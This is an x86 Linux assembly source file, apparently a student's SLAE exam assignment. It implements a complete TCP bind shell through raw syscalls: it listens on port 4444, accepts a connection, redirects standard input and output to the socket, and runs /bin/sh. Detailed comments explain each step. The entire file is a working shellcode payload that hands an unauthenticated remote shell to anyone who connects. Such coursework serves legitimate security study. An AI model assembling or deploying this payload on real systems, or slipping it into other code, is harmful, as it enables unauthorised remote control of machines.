; Filename: assignment1.nasm
; Author:  Adam Brown
; Website:  https://coffeegist.com
;
;
; Purpose: Create TCP Bind Shell for SLAE Exam, Assignment 1

global _start

section .text
_start:

  ; Clear out registers before we get started
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  mul ebx ; zero out eax


; CREATE SOCKET
; int socket(int domain, int type, int protocol) //
; syscall number: 359 (0x167)
;
; Argument Values:
; EBX -> domain = 2 (AF_INET/IPv4)
; ECX -> type = 1 (SOCK_STREAM/TCP)
; EDX -> protocol = 6 (IPPROTO_TCP)
;
; Note: For protocol, we could also use 0, as the man page for socket tells us,
; "Normally only a single protocol exists to support a particular socket type
;   within a given protocol family, in which case protocol can be specified
;   as 0."

  mov bl, 2
  mov cl, 1
  mov dl, 6
  mov ax, 0x167
  int 0x80


; BIND TO ADDRESS
; int bind (int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; syscall number: 361 (0x169)
;
; Argument Values:
; sockfd = value in eax returned by socket()
; *addr = memory address of structure containing:
;   - sin_family: 0x0002 (AF_INET/IPv4)
;   - sin_port: 0x115c (4444)
;   - sin_addr.s_addr: 0x00000000 (0.0.0.0)
; addrlen = 0x10 (16/sizeof(sockaddr_in))

  xor edx, edx
  mov ebx, eax ; mov sockfd value into ebx
  push edx ; push 0x00000000 for sin_addr.s_addr
  push word 0x5c11 ; push 0x115c for sin_port
  push word 0x02 ; push 0x0002 for sin_family
  mov ecx, esp ; memory pointer to our sockaddr struct
  mov dl, 0x10
  mov ax, 0x169
  int 0x80


; LISTEN FOR CONNECTIONS
; int listen(int sockfd, int backlog);
; syscall number: 363 (0x16b)
;
; Argument Values:
; sockfd = value in ebx
; backlog = 0

  xor ecx, ecx
  mov ax, 0x16b
  int 0x80


; ACCEPT CONNECTIONS
; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
; syscall number: 364 (0x16c)
;
; Argument Values:
; sockfd = value in ebx
; *sockaddr = NULL (0x00)
; *addrlen = NULL (0x00)
; flags = NULL

  xor esi, esi
  xor edx, edx
  mov ax, 0x16c
  int 0x80


; CHANGE STD FILE DESCRIPTORS
; int dup2(int oldfd, int newfd);
; syscall number: 63 (0x3f)
;
; Argument Values:
; oldfd = value in eax returned by accept()
; newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

  mov ebx, eax ; preserve clientfd from ACCEPT call
  mov cl, 3 ; 3 file descriptors (stdin, stdout, stderr)

dup_descriptors:
  dec cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  mul edx ; zero out eax
  mov al, 0x3f
  int 0x80 ; dup2 stdin
  inc cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  loop dup_descriptors


; EXECVE SHELL
; int execve(const char *filename, char *const argv[], char *const envp[]);
; syscall number: 11 (0xb)
;
; Argument Values:
; *filename = Memory address of a null terminated string "/bin/sh"
; *argv[] = [*"/bin/sh", 0x00000000]
; *envp = NULL

  xor ecx, ecx

  ; This has to be pushed in reverse because of how things move to the stack
  ; Pushing /bin/sh null terminated string
  push cx
  push dword 0x68732f2f ; push / / s h
  push dword 0x6e69622f ; push / b i n

  mov ebx, esp ; Store pointer to "/bin/sh" in ebx
  push ecx ; Push NULL
  push ebx ; Push *filename
  mov ecx, esp ; Store memory address pointing to memory address of "/bin/sh"
  mov al, 0xb
  int 0x80 ; Execute SHELL


; EXIT
  xor eax, eax
  mov al, 1;
  int 0x80;
